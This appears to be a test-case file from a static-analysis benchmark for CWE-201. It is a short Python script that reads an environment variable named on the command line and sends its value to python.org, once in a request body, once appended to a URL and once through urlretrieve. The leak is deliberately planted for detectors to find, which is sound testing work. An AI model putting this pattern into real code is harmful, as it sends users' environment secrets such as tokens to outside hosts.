import urllib.request
import os
import sys

# Attack.Payload: python3 201_send_info_leak.py  "USER"

tainted_request = 'http://python.org/'+os.getenv(sys.argv[1]) 

urllib.request.Request('http://python.org/',os.getenv(sys.argv[1])) # CWEID 201
urllib.request.urlopen('http://python.org/'+os.getenv(sys.argv[1])) # CWEID 201
urllib.request.urlretrieve(tainted_request)
